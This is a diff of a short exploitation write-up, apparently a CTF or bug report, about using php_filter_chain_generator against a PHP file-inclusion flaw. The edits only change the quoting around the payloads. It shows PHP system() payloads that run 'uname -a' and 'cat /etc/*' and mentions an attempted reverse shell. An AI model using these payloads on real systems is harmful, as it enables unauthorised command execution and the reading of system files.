@@ -43,11 +43,11 @@ Then i try to make a rev shell like this ```python php_filter_chain_generator.py
 
 but when i try it did not work becuse it's vary large payload
 
-i try to run command directly like that php_filter_chain_generator.py --chain '<?php system("uname -a");?>' 
+i try to run command directly like that php_filter_chain_generator.py --chain ```<?php system("uname -a");?>``` 
 
 ![image](https://github.com/user-attachments/assets/9e8f4006-f965-40df-95f0-503971e9661e)
 
-Then i try to read all the file of the /etc/ dir i try this payload python php_filter_chain_generator.py --chain '<?php system("cat /etc/*");?>'
+Then i try to read all the file of the /etc/ dir i try this payload python php_filter_chain_generator.py --chain ```<?php system("cat /etc/*");?>```
 
 ![Screenshot 2024-09-25 155901](https://github.com/user-attachments/assets/6c29cfce-050b-4e53-bb4b-aefdbc4fc308)
 
